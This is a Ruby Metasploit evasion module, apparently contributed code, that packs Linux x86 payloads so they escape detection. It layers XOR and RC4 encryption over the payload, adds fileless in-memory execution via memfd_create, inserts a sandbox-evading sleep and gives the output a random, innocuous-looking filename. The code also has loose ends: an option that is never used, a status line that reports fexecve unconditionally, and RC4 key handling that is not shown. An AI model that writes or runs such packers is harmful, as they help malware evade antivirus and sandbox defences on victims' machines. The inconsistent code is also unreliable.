##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Evasion

  include Msf::Payload::Linux::X86::Rc4Decrypter
  include Msf::Payload::Linux::X86::ElfLoader
  include Msf::Payload::Linux::X86::SleepEvasion

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Linux RC4 Packer with In-Memory Execution (x86) - Ultimate',
        'Description' => %q{
          Ultimate evasion module combining best features.
          
          Features:
          - RC4 encryption with dynamic key
          - Fileless execution via memfd_create
          - XOR encoding layer
          - Dynamic filename generation
          - Sandbox evasion (sleep)
        },
        'Author' => ['Massimo Bertocchi'],
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => [ARCH_X86],
        'Targets' => [['Linux x86', {}]],
        'DefaultTarget' => 0
      )
    )

    register_options([
      OptString.new('FILENAME', [false, 'Output filename', nil]),
      OptInt.new('SLEEP_TIME', [false, 'Sleep Time for Sandbox Evasion', 0]),
      OptInt.new('XOR_KEY', [false, 'XOR Key (0 for random)', 0]),
      OptBool.new('USE_FEXECVE', [false, 'Use fexecve instead of memfd', false])
    ])
  end

  def run
    begin
      raw_payload = payload.encoded
      if raw_payload.blank?
        fail_with(Failure::BadConfig, 'Failed to generate payload')
      end

      # Generate dynamic XOR key if not set
      xor_key = datastore['XOR_KEY']
      xor_key = rand(1..255) if xor_key == 0
      
      # Generate filename dynamically
      filename = datastore['FILENAME']
      filename ||= "proc_#{rand(10000..99999)}"
      filename += '.elf' unless filename.end_with?('.elf')

      print_status('Generating payload...')
      
      # Convert payload to ELF
      elf_payload = Msf::Util::EXE.to_linux_x86_elf(framework, raw_payload)
      
      # Apply in-memory loading
      loader_code = in_memory_load(elf_payload)
      
      # Apply XOR encoding
      encoded_data = apply_xor(loader_code, xor_key)
      
      # Apply RC4 encryption
      encrypted = rc4_decrypter(data: encoded_data)
      
      # Apply sleep evasion FIRST
      sleep_code = sleep_evasion(seconds: datastore['SLEEP_TIME'])
      
      # Combine all components
      complete_loader = sleep_code + encrypted
      
      # Generate final ELF
      final_elf = Msf::Util::EXE.to_linux_x86_elf(framework, complete_loader)

      # Save to file
      File.binwrite(filename, final_elf)
      File.chmod(0o755, filename)
      
      # Success output
      print_good("Payload saved to: #{filename}")
      print_status("XOR Key: 0x#{xor_key.to_s(16).upcase}")
      print_status('Encryption: XOR + RC4')
      print_status('Execution: memfd_create + fexecve')
      
    rescue => e
      print_error("Error: #{e.message}")
      fail_with(Failure::Unknown, 'Module execution failed')
    end
  end
  
  def apply_xor(data, key)
    data.bytes.map { |b| b ^ key }.pack('C*')
  end
end
